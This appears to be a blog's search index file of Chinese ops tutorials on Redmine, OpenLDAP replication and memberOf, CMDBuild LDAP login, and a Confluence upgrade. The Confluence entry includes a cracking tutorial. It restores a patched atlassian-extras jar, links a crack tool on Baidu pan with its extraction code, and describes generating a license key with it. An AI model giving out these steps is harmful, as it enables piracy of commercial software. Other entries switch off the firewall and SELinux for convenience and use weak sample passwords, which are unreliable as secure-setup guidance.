<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[docker安装redmine服务]]></title>
    <url>%2Farticles%2F40baf0f.html</url>
    <content type="text"><![CDATA[目的快速搭建redmine服务，以便能够对项目和工作流进行管控。 参考文档官方文档或者docker官方 步骤用SQLite3运行Redmine这是最简单的方式 1docker run -d --name sunredmine redmine:3.4 使用数据库容器运行Redmine建议使用数据库服务器运行Redmine。 1, 启动数据库容器 PostgreSQL 1docker run -d --name some-postgres --network some-network -e POSTGRES_PASSWORD=secret -e POSTGRES_USER=redmine postgres MySQL的（替代-e REDMINE_DB_POSTGRES=some-postgres与-e REDMINE_DB_MYSQL=some-mysql运行管理平台时） 1docker run -d --name some-mysql --network some-network -e MYSQL_USER=redmine -e MYSQL_PASSWORD=secret -e MYSQL_DATABASE=redmine -e MYSQL_RANDOM_ROOT_PASSWORD=1 mysql:5.7 2, 运行redmine 1docker run -d --name some-redmine --network some-network -e REDMINE_DB_POSTGRES=some-postgres -e REDMINE_DB_USERNAME=redmine -e REDMINE_DB_PASSWORD=secret redmine 完整例子假设已有postgres数据库容器 1234567891011121314151617docker run --name pgsql -p 5432:5432 -e POSTGRES_PASSWORD=sunxu123 -v /data/postgres:/var/lib/postgresql/data -d postgres:9.4# 进入容器后操作docker exec -it pgsql /bin/bash# 进Postgresql账号su postgres#CREATE USER redmine WITH PASSWORD 'Sun123';# 建库createdb -O redmine redmine 和 CREATE DATABASE redmine OWNER redmine等效,二选一即可# 赋权GRANT ALL PRIVILEGES ON DATABASE redmine to redmine;# 启动redminedocker run --name redmine -p 10083:3000 -v /data/redmine/data:/usr/src/redmine/files --link pgsql:remine -d redmine:3.4# 查看日志docker logs -f remine 功能完善邮件123456789101112131415docker redmine:/usr/src/redmine/config/configuration.yml.example ./mv configuration.yml.example configuration.ymlvim configuration.ymldefault: email_delivery: delivery_method: :smtp smtp_settings: enable_starttls_auto: true address: "xxxxxxxxxxx" port: 587 authentication: :login domain: 'xxxxxxxxxxxxxx' user_name: 'xxxxxxxxxxxxx' password: 'xxxxxxxxxxxx' 测试是否配置成功：打开Redmine &gt;管理员登陆 &gt; 管理 &gt; 配置 &gt; 邮件通知 &gt;页面底部:发送测试邮件。将会发送邮件到你目前登陆的用户邮箱中。 如果没有配置成功，则这个选项卡显示的是黄色的字，如未对邮件进行配置，config/configuration.yml。 ldap接入和用户同步原始的ldap认证，我试了下不完美，他需要创建用户然后使用ldap认证，也就是说还是需要先去创建用户。这样显得很麻烦 Base dn是基准DN LDAP过滤器是用来过滤你需要加入到redmine里的用户，我这里是用对象类即objectclass去filter用户 认证模式改以下就好。 但是这样还是创建用户 还是麻烦 这个时候需要用到ldap的插件（Redmine LDAP Sync） 插件安装基本官网都有说 git：https://github.com/thorin/redmine_ldap_sync#rake-tasks 里面有介绍我这里就不说了，大致上就两步 123456因为这个插件好多年不再维护了只能支持redmine3.4.x最新的redmine4.0.x不支持，会报错，这也是为什么docker启动时用3.4版本的原因1，在#&#123;RAILS_ROOT&#125;/plugins目录下下载插件git clone git://github.com/thorin/redmine_ldap_sync.git2，在#&#123;RAILS_ROOT&#125; 目录下执行rake -T redmine:plugins:ldap_sync RAILS_ENV=production 插件安装好之后重启redmine也就是nginx 然后打开web发现会多一个ldap sync 填写好测试完成看看结果 配置项根据自己的环境设置，设置好之后点击第三栏菜单test是否可以取出成功， 可以的话就直接激活这个ldap sync 之后直接去登录就可以了。]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker构建自己的openldap自助密码服务]]></title>
    <url>%2Farticles%2Fd83ca733.html</url>
    <content type="text"><![CDATA[背景OpenLDAP安装完毕后，如果用户要修改密码的话，就需要通过OpenLDAP管理员来进行修改。为了解放管理员的工作，让OpenLDAP用户可以自行进行密码的修改和重置，就需要我们来搭建一套自助修改密码系统。 在此我们使用的是开源的基于php语言开发的ldap自助修改密码系统Self Service Password。 教程参考文档 按照参考文档正确配置并构建镜像，运行后，登录网页访问，通过网页修改账号密码验证 问题如果遇到以下错误： 修改配置: 1$keyphrase = &quot;secret&quot;; 改为 $keyphrase = &quot;sunxu&quot;; #任意字符串 重启容器，再次访问。 验证邮件重置密码： 查看邮件 修改完成会收到一条邮件：]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[confluence6.3.1升级最新版本6.15.8]]></title>
    <url>%2Farticles%2F4afcf658.html</url>
    <content type="text"><![CDATA[背景收到公司总部安全部门扫描测试，查出公司内部confluence的版本太低，存在安全漏洞。给出的解决方案是升级到最新版本，最新版本已经把该漏洞修复。本文就详细介绍下confluence的升级过程。 参考官方文档 升级流程备份你的数据官方备份方法点击一般设置的，点击备份和还原 自行备份1，备份数据源。默认路径为：/var/atlassian/application-data/confluence/confluence.cfg.xml 2，备份附件。默认路径为：/var/atlassian/application-data/confluence/attachments 安装部署最新版破解文件备份1mv /opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.4.1.jar ~/atlassian-extras-2.4.jar 下载官网下载地址，放在/opt 执行12chmod +x atlassian-confluence-6.15.1-x64.bin #赋予可执行权限./atlassian-confluence-6.15.1-x64.bin #执行安装 到了红圈这步选择3，回车。表示升级 备份下面询问你是否要备份，上面我们已经自己备份了，也可选他默认备份 确认更新会展示了一些改变的文件（破解文件变了，下面伏笔），问你同意 成功部署访问 ip:8090 重新破解破解包被升级，有机会出现下面画面，代表验证不通过 把备份的atlassian-extras-2.4.jar文件复制到/opt/atlassian/confluence/confluence/WEB-INF/lib，并重命名为该版本的文件名 1mv ~/atlassian-extras-2.4.jar /opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.4.1.jar 重启服务 数据和附件，无损升级到，6.15.8 破解教程有的同学可能没有备份破解文件，或者可能不是自己搭建的，现在刚刚接手。那么如何破解呢？ 下载破解工具链接: https://pan.baidu.com/s/13GZ-3XutMEyE3cUl9rwg_Q 提取码: 7gtd 破解工具是个jar包，所以需要jdk环境。jdk环境配置在网上很多，这里省略。java -jar 破解文件.jar 获取信息123# 升级时grep -Po "(?&lt;=server.id\"\&gt;).*(?=\&lt;)" /var/atlassian/application-data/confluence/confluence.cfg.xml# 全新安装此步骤跳过 生产key先点.patch加载从服务器复制出来的atlassian-extras-2.4.jar文件，然后点.gen破解 破解如权限安装，如下图填写 如升级，如下图更改配置 vim /var/atlassian/application-data/confluence/confluence.cfg.xml 把破解后的文件atlassian-extras-2.4.jar复制到服务器的/opt/atlassian/confluence/confluence/WEB-INF/lib/，并重命名为该版本的名称，如：atlassian-extras-decoder-v2-3.4.1.jar 接入Ldap管理员登录，一般配置–&gt;用户目录–&gt;添加用户目录–&gt;Ldap 填写信息]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Confluence</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cmdbuild接入openldap方法]]></title>
    <url>%2Farticles%2F364a7d87.html</url>
    <content type="text"><![CDATA[目的cmdbuid接入openldap用户权限，便于用户统一管理。 前提条件已安装好cmdbuid和openldap。 安装cmdbuild 安装openldap 步骤1, 参考官方文档，如下图 翻译大意是 12345678910111213LDAP协议配置在本节中，我们将看到LDAP协议的配置选项。CMDBuild目前仅支持使用简单绑定进行身份验证。但是可以使用匿名绑定以在LDAP树中搜索用户。要在CMDBuild中处理用户权限，必须存在要进行身份验证的用户在用户数据库表中。例如，如果具有LDAP UID j.doe的用户需要访问CMDBuild使用Tech Group必须遵循以下步骤：•使用任何密码在CMDBuild中创建用户j.doe•创建Tech组并定义其权限•将j.doe添加到Tech组经过上面三步后，当用户j.doe尝试验证自己时，系统将验证提供的凭据在LDAP服务器上（按身份验证类型链指定的顺序）。所以就是所需要事先安装openldap树在cmdbuild中创建用户组和用户，这样配置后才能认证，感觉有点多次一举，我既然都事先创建了，干嘛还要接入openldap。最好的方法是直接读取认证，但是目前官方不支持。有个想法是直接写脚本把openldap信息读取出来定时写入到cmdbuild数据库中，这样就可以实现统一管控。 2, 配置cmdbuild认证文件 123456789101112131415161718192021222324252627282930313233343536373839404142vim /usr/local/tomcat/webapps/ROOT/WEB-INF/conf/auth.conf## Authentication method chain (the first match stops the auth chain)#auth.methods=HeaderAuthenticator,CasAuthenticator,LdapAuthenticator,DBAuthenticatorauth.methods=LdapAuthenticator#auth.case.insensitive=false#force.ws.password.digest=true#### HEADER###header.attribute.name=username#### CAS###cas.server.url=https://casserver/cas#cas.login.page=/login#cas.service.param=service#cas.ticket.param=ticket#### LDAP##ldap.server.address=xxx.xxx.xxxx.xxxldap.server.port=389ldap.use.ssl=falseldap.basedn=dc=wandouduoduo,dc=comldap.bind.attribute=uidldap.search.filter=(objectClass=*)##Accept only none (anonymous bind) and simple (simple bind)#ldap.search.auth.method=none##This section is only for simple bindldap.search.auth.method=simpleldap.search.auth.principal=cn=admin,dc=wandouduoduo,dc=comldap.search.auth.password=xxxx 3，重启cmdbuild，生效配置。 4，日志改为debug模式，便于观察。 1vim /usr/local/tomcat/webapps/ROOT/WEB-INF/conf/log4j.conf 经过上述步骤就可实现接入步骤，观察日志，如下图： 表示认证成功，后续会补充同步脚本。]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Cmdb</tag>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker版快速安装OpenLDAP]]></title>
    <url>%2Farticles%2F931613a4.html</url>
    <content type="text"><![CDATA[目的互联网公司中，会开发很多平台系统，有开源的有自演的，但是每个平台或系统在用户认证方面都需要做，而且处于安全等因素考虑还必须做，统一的用户管理机制可以解决这一痛点。openldap就是这么一个工具。本文，通过docker快速搭建起来，让你体会到它的魅力。 参考文档官网 镜像文档 步骤拉取镜像1docker pull osixia/openldap 运行镜像123456#存放数据库mkdir -p /data/openldap/ldap#存放配置mkdir -p /data/openldap/slapd.ddocker run -p 389:389 --name openldap -v /data/openldap/ldap:/var/lib/ldap -v /data/openldap/slapd.d:/etc/openldap/slapd.d --network bridge --hostname openldap-host --env LDAP_ORGANISATION="wandouduoduo" --env LDAP_DOMAIN="wandouduoduo.com" --env LDAP_ADMIN_PASSWORD="Sun123456" --detach osixia/openldap 配置LDAP域：--env LDAP_DOMAIN=&quot;wandouduoduo.com&quot; 配置LDAP密码：--env LDAP_ADMIN_PASSWORD=&quot;Sun123456&quot; 默认登录用户名：admin 客户端LDAP Admin客户端Ldap Admin是一个用于LDAP目录管理的免费Windows LDAP客户端和管理工具。此应用程序允许您在LDAP服务器上浏览，搜索，修改，创建和删除对象。它还支持更复杂的操作，例如目录复制和在远程服务器之间移动，并扩展常用编辑功能以支持特定对象类型（例如组和帐户）。 支持系统：Winndows&amp;Linux 官网 下载安装LDAP Admin客户端，新增连接如下： 连接成功即表明OpenLDAP安装成功。 PHPLdapAdmin客户端phpLDAPadmin（也称为PLA）是一个基于Web的LDAP客户端。它为LDAP服务器提供简单，随处可访问的多语言管理。 其分层树查看器和高级搜索功能使您可以直观地浏览和管理LDAP目录。由于它是一个Web应用程序，因此该LDAP浏览器可在许多平台上运行，使您可以从任何位置轻松管理LDAP服务器。 phpLDAPadmin是LDAP专业人员和新手的完美LDAP浏览器。其用户群主要由LDAP管理专业人员组成。 官网 使用docker 安装 PHPLdapAdminhttps://github.com/osixia/docker-phpLDAPadmin 1docker run -d --privileged -p 10004:80 --name myphpldapadmin --env PHPLDAPADMIN_HTTPS=false --env PHPLDAPADMIN_LDAP_HOSTS=172.17.0.6 --detach osixia/phpldapadmin 配置的Ldap地址：--env PHPLDAPADMIN_LDAP_HOSTS=172.17.0.6 配置不开启HTTPS：--env PHPLDAPADMIN_HTTPS=false（默认是true） 如果开启HTTPS，需要配置443端口映射：-p 8443:443，并采用https访问 通过访问http://localhost:10004 来管理，登陆界面 点击login进行登录 Login DN：cn=admin,dc=wandouduoduo,dc=com Password：ldap123 登录成功后如下： 总结通过本文可以快速搭建和使用openldap, 但是默认openldap是没有打开memerof功能的，如有兴趣，请参考 OpenLDAP启用MemberOf ldapsearch用法]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenLDAP启用MemberOf]]></title>
    <url>%2Farticles%2F53f92c3c.html</url>
    <content type="text"><![CDATA[目的默认情况下OpenLDAP的用户组属性是Posixgroup，Posixgroup用户组和用户没有实际的对应关系。如果需要把Posixgroup和user关联起来则需要将用户添加到对应的组中。 通过如上配置可以满足大部分业务场景，但是如果需要通过用户组来查找用户的话，Posixgroup用户组属性，是无法满足要求的。此时需要使用OpenLDAP的groupOfUniqueNames用户组属性。本篇文章Fayson主要介绍如何为OpenLDAP启用MemberOf。 环境OpenLDAP版本为2.4.44 步骤先查看openldap的数据库信息123ls /etc/openldap/slapd.d/cn=config/或者ldapsearch -Q -LLL -Y EXTERNAL -H ldapi:/// -b cn=config dn 得到的结果大概如下，不一样也不要害怕: 1cn=module&#123;0&#125;.ldif cn=schema/ cn=schema.ldif olcDatabase=&#123;0&#125;config.ldif olcDatabase=&#123;-1&#125;frontend.ldif olcDatabase=&#123;1&#125;monitor.ldif olcDatabase=&#123;2&#125;bdb/ olcDatabase=&#123;2&#125;bdb.ldif 其中有一个带什么db.ldif的就是你最终需要修改的数据库文件，我这里是bdb.ldif，你的可能是mdb.ldif，还有人是hdb.ldif，不管什么db，总之你要改的是一个叫db的文件就对了，你可以cat打开看一看，但是不要用vi去修改它。 准备memberof_conf.ldif文件12345678910111213141516171819202122vim memberof_conf.ldif#开启memberof支持dn: cn=module&#123;0&#125;,cn=configcn: modulle&#123;0&#125;objectClass: olcModuleListobjectclass: topolcModuleload: memberof.laolcModulePath: /usr/lib64/openldap#新增用户支持memberof配置dn: olcOverlay=&#123;0&#125;memberof,olcDatabase=&#123;2&#125;hdb,cn=configobjectClass: olcConfigobjectClass: olcMemberOfobjectClass: olcOverlayConfigobjectClass: topolcOverlay: memberofolcMemberOfDangling: ignoreolcMemberOfRefInt: TRUEolcMemberOfGroupOC: groupOfUniqueNamesolcMemberOfMemberAD: uniqueMemberolcMemberOfMemberOfAD: memberOf 编辑refint1.ldif文件12345vim refint1.ldif dn: cn=module&#123;0&#125;,cn=configadd: olcmoduleloadolcmoduleload: refint 编辑refint2.ldif文件12345678910 vim refint2.ldif dn: olcOverlay=refint,olcDatabase=&#123;2&#125;hdb,cn=configobjectClass: olcConfigobjectClass: olcOverlayConfigobjectClass: olcRefintConfigobjectClass: topolcOverlay: refintolcRefintAttribute: memberof member manager owner#olcRefintAttribute: memberof uniqueMember manager owner 导入配置1234#注意：导入时文件路径跟绝对路径ldapadd -Q -Y EXTERNAL -H ldapi:/// -f /data/disk1/openladp/memberof_conf.ldif ldapmodify -Q -Y EXTERNAL -H ldapi:/// -f /data/disk1/openladp/refint1.ldif ldapadd -Q -Y EXTERNAL -H ldapi:/// -f /data/disk1/openladp/refint2.ldif 以上步骤就完成了OpenLDAP的MemberOf模块启用。 验证验证一下配置，这个命令可以列出所有配置 1slapcat -b cn=config 创建用户测试 1, 创建一个测试用户cdsw_a,ldif文件内容如下： 123456789101112131415161718vim cdsw_user.ldifdn: uid=cdsw_a,ou=People,dc=fayson,dc=comuid: cdsw_acn: cdsw_aobjectClass: accountobjectClass: posixAccountobjectClass: topobjectClass: shadowAccountuserPassword: 123456shadowLastChange: 17694shadowMin: 0shadowMax: 99999shadowWarning: 7loginShell: /bin/bashuidNumber: 10001gidNumber: 10001homeDirectory: /home/cdsw_a 2, 执行如下命令将cdsw_a用户导入到OpenLDAP中 1ldapadd -D &quot;cn=Manager,dc=fayson,dc=com&quot; -W -x -f cdsw_user.ldif 3, 创建一个新的groupOfUniqueNames用户组，并把cdsw_a用户添加到该组 123456vim cdsw_group.ldif dn: cn=cdsw_admin,ou=Group,dc=fayson,dc=comobjectClass: groupOfUniqueNamescn: cdsw_adminuniqueMember: uid=cdsw_a,ou=People,dc=fayson,dc=com 将cdsw_admin组添加到OpenLDAP中 通过命令查看用户所属组，命令如下 1ldapsearch -LL -Y EXTERNAL -H ldapi:/// "(uid=cdsw_a)" -b dc=fayson,dc=com memberOf 总结在OpenLDAP中配置启用MemberOf时需要注意配置文件的通配符{0}/{2},这个数字不是随意指定的而是根据当前的/etc/openldap/slapd.d/cn=config/生成的内容得出 搜索例子 12345# docker openldapdocker exec xxxx ldapsearch -x -D &quot;cn=admin,dc=xxxx,dc=com&quot; -w &quot;xxxx&quot; -b &quot;dc=xxxx,dc=com&quot; &quot;cn=*&quot;#现在默认用docker安装openldap是开启了memberof，所以直接添加用户，添加用户组后，直接用下面命令验证ldapsearch -LL -H ldapi:/// -D &quot;cn=admin,dc=xxx,dc=net&quot; -W &quot;(uid=sunxu)&quot; -b dc=xxx,dc=net memberOf]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7上配置最新版openldap服务多主模式(镜像模式)]]></title>
    <url>%2Farticles%2F3337f7d4.html</url>
    <content type="text"><![CDATA[目的在实际产线运维环境下，使用最多的就是镜像模式，当然多IDC机房的情况下也会结合使用其他模式，例如主从模式。 镜像模式只允许2个主节点，如果超过2个节点其他节点只会同步获取前面2个节点的配置（这个是博客文档里面看到的，没有验证） 环境 主机名称 地址 版本 角色 备注 sysldap-shylf-1 10.116.72.11 CentOS7.6 min openLdap, httpd, phpldapadmin 主节点 sysldap-shylf-2 10.116.72.12 CentOS7.6 min openLdap, httpd, phpldapadmin 主节点 systerm-shylf-1 10.116.72.15 CentOS7.6 min openLdap client 前提条件，为了方便配置防火墙以及禁用selinux配置示例:dc=example,dc=com OpenLDAP服务基础配置本文档假设2个节点都已经设置好了OpenLDAP服务基础配置 配置OpenLDAP 双主结构（mirrormode）OpenLDAP的2个主节点都需要添加模块syncprov2个主节点都需要执行 123456789101112131415161718192021vim mod_syncprov.ldifdn: cn=module,cn=configobjectClass: olcModuleListcn: moduleolcModulePath: /usr/lib64/openldapolcModuleLoad: syncprov.la# 发送配置使之生效ldapadd -Y EXTERNAL -H ldapi:/// -f mod_syncprov.ldif#--------------------------------------vim syncprov.ldifdn: olcOverlay=syncprov,olcDatabase=&#123;2&#125;hdb,cn=configobjectClass: olcOverlayConfigobjectClass: olcSyncProvConfigolcOverlay: syncprovolcSpSessionLog: 100# 发送配置使之生效ldapadd -Y EXTERNAL -H ldapi:/// -f syncprov.ldif 主节点1配置(10.116.72.11)同步需要根据实际情况修改的参数：provider 同步来源，也就是主节点，可以包含多个主节点binddn 主节点管理账户credentials 主节点管理账户密码searchbase 根目录特别主机：2个主节点属性 olcServerID的值不能相同，provider指向对方 1234567891011121314151617181920212223242526272829303132vim master_node_1.ldifdn: cn=configchangetype: modifyreplace: olcServerIDolcServerID: 0dn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifyadd: olcSyncReplolcSyncRepl: rid=001 provider=ldap://10.116.72.12:389/ bindmethod=simple binddn="cn=Manager,dc=example,dc=com" credentials=openldap searchbase="dc=example,dc=com" scope=sub schemachecking=on type=refreshAndPersist retry="30 5 300 3" interval=00:00:05:00-add: olcMirrorModeolcMirrorMode: TRUEdn: olcOverlay=syncprov,olcDatabase=&#123;2&#125;hdb,cn=configchangetype: addobjectClass: olcOverlayConfigobjectClass: olcSyncProvConfigolcOverlay: syncprov# 发送配置使之生效ldapadd -Y EXTERNAL -H ldapi:/// -f master_node_1.ldif 主节点2配置(10.116.72.12)同步特别主机：2个主节点属性 olcServerID的值不能相同，provider指向对方 123456789101112131415161718192021222324252627282930313233vim master_node_2.ldifdn: cn=configchangetype: modifyreplace: olcServerIDolcServerID: 1dn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifyadd: olcSyncReplolcSyncRepl: rid=001 provider=ldap://10.116.72.11:389/ bindmethod=simple binddn="cn=Manager,dc=example,dc=com" credentials=openldap searchbase="dc=example,dc=com" scope=sub schemachecking=on type=refreshAndPersist retry="30 5 300 3" interval=00:00:05:00-add: olcMirrorModeolcMirrorMode: TRUEdn: olcOverlay=syncprov,olcDatabase=&#123;2&#125;hdb,cn=configchangetype: addobjectClass: olcOverlayConfigobjectClass: olcSyncProvConfigolcOverlay: syncprov# 发送配置使之生效ldapadd -Y EXTERNAL -H ldapi:/// -f master_node_2.ldif 验证 12345从服务节点验证数据是否同步正常ldapsearch -x -b 'ou=People,dc=example,dc=com'[输出内容省略]验证是OK的。 远程主机配置（客户端 10.116.72.15）客户端 可以指定多个openldap uri 修改配置如下（当然也可以只配置其中1个） 1authconfig --enableldap --enableldapauth --ldapserver="10.116.72.11,10.116.72.12" --ldapbasedn="dc=example,dc=com" --update 验证 123456ssh 800001@10.116.72.15Warning: Permanently added '10.116.72.15' (ECDSA) to the list of known hosts.800001@10.116.72.15's password: Last login: Thu Jul 4 17:59:32 2019 from 10.116.71.200[800001@systerm-shylf-1 ~]$]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7上配置最新版openldap服务主从架构]]></title>
    <url>%2Farticles%2F760f3c02.html</url>
    <content type="text"><![CDATA[目的在实际产线运维环境下，可能包含多个IDC机房，每个机房的主机都需要通过OpenLDAP体系管理运维账户登录。这种情况下可以配置OpenLDAP的主从架构实现(当然同一个机房也可以配置主从架构，客户端配置ldap uri指定多个地址)。主openldap节点称为“provider”可读可写，从openldap节点称为“consumer”只读。 环境 主机名称 地址 版本 角色 备注 sysldap-shylf-1 10.116.72.11 CentOS7.6 min openLdap, httpd, phpldapadmin 主节点 sysldap-shylf-2 10.116.72.12 CentOS7.6 min openLdap 从节点，可以配置多从的 systerm-shylf-1 10.116.72.15 CentOS7.6 min openLdap client 前提条件，为了方便配置防火墙以及禁用selinux配置示例:dc=example,dc=com OpenLDAP服务基础配置本文档假设2个节点都已经设置好了OpenLDAP服务基础配置 配置OpenLDAP主从结构主节点配置(10.116.72.11)，添加模块syncprov123456789101112131415161718192021vim mod_syncprov.ldifdn: cn=module,cn=configobjectClass: olcModuleListcn: moduleolcModulePath: /usr/lib64/openldapolcModuleLoad: syncprov.la# 发送配置使之生效ldapadd -Y EXTERNAL -H ldapi:/// -f mod_syncprov.ldif#--------------------------------------vim syncprov.ldifdn: olcOverlay=syncprov,olcDatabase=&#123;2&#125;hdb,cn=configobjectClass: olcOverlayConfigobjectClass: olcSyncProvConfigolcOverlay: syncprovolcSpSessionLog: 100# 发送配置使之生效ldapadd -Y EXTERNAL -H ldapi:/// -f syncprov.ldif 从节点配置(10.116.72.12)同步需要根据实际情况修改的参数：provider 同步来源，也就是主节点，可以包含多个主节点binddn 主节点管理账户credentials 主节点管理账户密码searchbase 根目录 12345678910111213141516171819vim syncrepl.ldifdn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifyadd: olcSyncReplolcSyncRepl: rid=001 provider=ldap://10.116.72.11:389/ bindmethod=simple binddn="cn=Manager,dc=example,dc=com" credentials=openldap searchbase="dc=example,dc=com" scope=sub schemachecking=on type=refreshAndPersist retry="30 5 300 3" interval=00:00:05:00# 发送配置使之生效ldapadd -Y EXTERNAL -H ldapi:/// -f syncrepl.ldif 验证 12345从服务节点验证数据是否同步正常ldapsearch -x -b &apos;ou=People,dc=example,dc=com&apos;[输出内容省略]验证是OK的。 远程主机配置（客户端 10.116.72.15）客户端 可以指定多个openldap uri 修改配置如下（当然也可以只配置其中1个） 1authconfig --enableldap --enableldapauth --ldapserver="10.116.72.11,10.116.72.12" --ldapbasedn="dc=example,dc=com" --update 验证 123456ssh 800001@10.116.72.15Warning: Permanently added '10.116.72.15' (ECDSA) to the list of known hosts.800001@10.116.72.15's password: Last login: Thu Jul 4 17:59:32 2019 from 10.116.71.200[800001@systerm-shylf-1 ~]$]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7上单节点安装配置最新版openldap服务]]></title>
    <url>%2Farticles%2Fbe8d00d3.html</url>
    <content type="text"><![CDATA[目的本文详细介绍了在centos7上安装最新版openldap的过程和常见场景。 环境操作系统：centos7.6 软件版本：openldap-2.4.44 配置示例: dc=example,dc=com 准备工作为了方便配置防火墙以及禁用selinux，或者关闭防火墙。 查看防火墙状态 1firewall-cmd --state 停止firewall 1systemctl stop firewalld.service 禁止firewall开机启动 1systemctl disable firewalld.service 关闭selinux 进入到/etc/selinux/config文件 12vim /etc/selinux/config将SELINUX=enforcing改为SELINUX=disabled OpenLDAP服务端配置创建一个配置目录，将相关配置文件放在这个目录下面 123456789101112openldap├── base.ldif├── config.ldif├── demo.ldif├── loglevel.ldif├── schema│ ├── sudo.ldif│ └── sudo.schema├── sudo_ops_role.ldif└── SUODers.ldifcd openldap 安装LDAP组件并启动服务123456789101112131415# yum安装yum -y install openldap openldap-clients openldap-servers # 建立Ldap数据库cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIGchown ldap:ldap /var/lib/ldap/*# 启动和开机自启systemctl start slapd.servicesystemctl enable slapd.service# 验证netstat -antup | grep -i 389tcp 0 0 0.0.0.0:389 0.0.0.0:* LISTEN 16349/slapd tcp6 0 0 :::389 :::* LISTEN 16349/slapd 配置OpenLDAP服务123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135# 生成Ldap root密码~]# slappasswdNew password: openldapRe-enter new password: openldap &#123;SSHA&#125;npo7WhvpY+s4+p584zAnoduStQzeTxHE# 添加需要的schemas [可以根据需要添加更多]ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldifldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif# 配置openLDAP服务vim config.ldifdn: olcDatabase=&#123;1&#125;monitor,cn=configchangetype: modifyreplace: olcAccessolcAccess: &#123;0&#125;to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external, cn=auth" read by dn.base="cn=Manager,dc=example,dc=com" read by * nonedn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifyreplace: olcSuffixolcSuffix: dc=example,dc=comdn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifyreplace: olcRootDNolcRootDN: cn=Manager,dc=example,dc=comdn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifyreplace: olcRootPWolcRootPW: &#123;SSHA&#125;npo7WhvpY+s4+p584zAnoduStQzeTxHEdn: olcDatabase=&#123;2&#125;hdb,cn=configchangetype: modifyadd: olcAccessolcAccess: &#123;0&#125;to attrs=userPassword,shadowLastChange by dn="cn=Manager,dc=example,dc=com" write by anonymous auth by self write by * noneolcAccess: &#123;1&#125;to dn.base="" by * readolcAccess: &#123;2&#125;to * by dn="cn=Manager,dc=example,dc=com" write by * read# 发送配置到LDAP服务ldapmodify -Y EXTERNAL -H ldapi:/// -f config.ldif# 域example.com配置vi base.ldifdn: dc=example,dc=como: example comdc: exampleobjectClass: topobjectClass: dcObjectobjectClass: organizationdn: cn=Manager,dc=example,dc=comobjectClass: organizationalRolecn: Managerdescription: LDAP Managerdn: ou=People,dc=example,dc=comobjectClass: organizationalUnitou: Peopledn: ou=Group,dc=example,dc=comobjectClass: organizationalUnitou: Group# 发送配置到LDAP服务ldapadd -x -W -D "cn=Manager,dc=example,dc=com" -f base.ldif# 配置ldap logvim loglevel.ldifdn: cn=configchangetype: modifyreplace: olcLogLevelolcLogLevel: stats# 发送配置到LDAP服务ldapmodify -Y EXTERNAL -H ldapi:/// -f loglevel.ldifecho "local4.* /var/log/slapd/slapd.log" &gt;&gt; /etc/rsyslog.confvi /etc/logrotate.d/slapd/var/log/openldap.log &#123; rotate 14 size 10M missingok compress copytruncate&#125;systemctl restart rsyslog# 如果有需要还可以配置日志轮转# 创建一个测试用户vi demo.ldifdn: uid=800001,ou=People,dc=example,dc=comobjectClass: topobjectClass: accountobjectClass: posixAccountobjectClass: shadowAccountcn: demouid: 800001uidNumber: 3000gidNumber: 100homeDirectory: /home/ldapusersloginShell: /bin/bashgecos: Demo [Demo user (at) example]userPassword: &#123;crypt&#125;xshadowLastChange: 17058shadowMin: 0shadowMax: 99999shadowWarning: 7dn: cn=ops,ou=Group,dc=example,dc=comobjectClass: posixGroupobjectClass: topcn: opsgidNumber: 80001memberUid: 800001# 创建ldapadd -x -W -D "cn=Manager,dc=example,dc=com" -f demo.ldif# 改密ldappasswd -s 'passwd@123' -W -D "cn=Manager,dc=example,dc=com" -x "uid=800001,ou=People,dc=example,dc=com"# 验证搜索ldapsearch -x uid=800001 -b dc=example,dc=com//删除使用如下命令，暂不删除，因后续实验需用到测试用户ldapdelete -W -D "cn=Manager,dc=example,dc=com" -x "uid=800001,ou=People,dc=example,dc=com" ldap客户端配置1234567891011121314151617181920212223# 安装组件yum install -y openldap-clients nss-pam-ldapd# 添加client服务器到LDAP服务,注意IPauthconfig --enableldap --enableldapauth --ldapserver="localhost" --ldapbasedn="dc=example,dc=com" --update# 这个指令修改了/etc/nsswitch.conf 以及/etc/openldap/ldap.conf文件# 启动ldap客户端服务systemctl restart nslcd# 验证getent passwd 800001800001:3000:100:Demo [Demo user (at) example]:/home/demo:/bin/bash# 远程ssh登录验证ssh 800001@10.116.72.15800001@10.116.72.15's password: 